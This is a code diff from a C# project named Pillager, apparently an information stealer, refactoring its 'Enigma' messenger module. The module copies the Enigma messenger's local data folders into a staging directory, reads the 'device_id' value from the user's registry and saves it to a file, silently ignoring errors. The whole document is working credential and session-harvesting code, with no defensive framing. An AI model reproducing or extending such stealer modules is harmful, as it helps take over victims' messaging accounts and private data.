@@ -1,22 +1,21 @@
 ﻿using System;
 using System.IO;
+using System.Text;
 using Microsoft.Win32;
 using Pillager.Helper;
 
 namespace Pillager.Messengers
 {
-    internal class Enigma
+    internal class Enigma : ICommand
     {
-        public static string MessengerName = "Enigma";
+        public string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Enigma\\Enigma");
 
-        public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Enigma\\Enigma");
-
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 if (!Directory.Exists(MessengerPath)) return;
-                string savepath = Path.Combine(path, MessengerName);
+                string savepath = Path.Combine(path, "Enigma");
                 Directory.CreateDirectory(savepath);
                 foreach (var temppath in Directory.GetDirectories(MessengerPath))
                 {
@@ -27,7 +26,7 @@ namespace Pillager.Messengers
                 }
                 RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Enigma\\Enigma");
                 string deviceid = (string)key.GetValue("device_id");
-                File.WriteAllText(Path.Combine(savepath, "device_id.txt"), deviceid);
+                File.WriteAllText(Path.Combine(savepath, "device_id.txt"), deviceid, Encoding.UTF8);
             }
             catch { }
         }
